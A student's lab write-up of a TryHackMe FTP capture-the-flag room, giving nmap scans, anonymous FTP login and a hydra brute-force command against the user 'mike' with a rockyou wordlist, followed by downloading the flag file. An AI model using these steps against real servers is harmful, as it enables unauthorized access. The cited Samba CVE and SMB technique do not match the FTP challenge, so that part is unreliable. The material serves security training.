# Documentation: TryHackMe Exploiting FTP #03

## 1. Introduction
- **Purpose**: Document my experience and share knowledge on the Cyber Defense challenges
- **Scope**:  Learn the fundamental components of detecting and responding to threats in a corporate environment

## 2. Setup
- **Environment**: Kali Linux via VirtualBox
- **Accounts and Access**: Created a TryHackMe account and accessed the room via OpenVPN

## 3. Challenge Walkthrough

### 3.1 Room Name: Network Services
- **Objective**: Access an FTP server and capture the flag by enumerating information then exploiting its vulnerabilities to exfiltrate sensitive data and gain access to the server and capture the flag

### 3.2 Enumeration
- **Initial Scanning**:
  - **Tools and Commands**:
    - Port Scanning & ftp server enumeration:
      - `nmap -A 10.10.40.220` -v
    	- `nmap -Pn 10.10.40.220` -v
      - Enter `ftp 10.10.40.220` to connect to the ftp server
      - Log in user as `anonymous` password press enter
      - Enter `ls` then `get PUBLIC_NOTICE.txt` to download the file to your local folder
      - Enter `cat PUBLIC_NOTICE.txt` in cli to open file to read contents

  - **Findings**:
      - Open port HTTP running on 80/tcp
      - Open port FTP running on 21/tcp
      - There's a file called PUBLIC_NOTICE.txt
      - There's a variant ftp version vsFTPd 3.0.3
      - FTP login as Anonymous is allowed
      - A possible username called, Mike
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/8e74319a-2ff8-4579-8c8b-9c3ab42c3a15)
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/1b5f1a6d-8305-4dab-902c-85eca9a4befb)
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/fc89cc76-e533-4a52-9bc8-2f1b89a2a87f)


### 3.3 Exploitation
- **Vulnerability Identification**: [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
  - **Techniques Used**:  exploiting anonymous SMB share access- a common misconfiguration allowing us to gain information that will lead to a shell.

- **Exploitation Process**:
      - Enter `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV 10.10.185.60 ftp` to brute force the password of mike using hydra
      - Syntax breakdown:
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/cbd19c6d-3285-45d8-8bd6-cd1b3f1ee35c)
  
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/49d232e3-475b-443b-88ec-cda3b7d247a9)
  
      - Now that we have the password, in the CLI `ftp 10.10.185.60` and press enter
      - In the name type `mike` and password type `password`
      - Now you gain access to the FTP server using Mike's credentials
      - Enter `ls -a` and exfiltrate data type `get ftp.txt`
  
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/c64463d0-1f68-442c-b628-8fadd1e22a82)
  
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/0f5a7712-54fd-4f22-a843-fc850c8bab72)
    
      - Type `cat ftp.txt` to view file content
  
  - ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/dc9bda70-c877-4a66-8356-c4c726f16252)



## 4. Analysis and Reflection
- **Challenges Faced**: This challenge was fairly easy compared to SMB and Telnet exploitation
- **Learnings**: I learned FTP's vulnerabilities like ARP-poisoning and that it sends clear text so it's not secured unlike its more secured alternative protocols like SFTP and FTPS
- **Improvements**: Do more hands-on activities like this to have practical skills while gaining theoretical knowledge

## 5. Conclusion
- **Summary**: Successfully learned target credentials and exfiltrated data and captured the flag

## 6. References
- [TryHackMe](https://tryhackme.com)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [ARP-Poisoning](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP)
- [Hydra Password Cracking Tool](https://github.com/vanhauser-thc/thc-hydra)
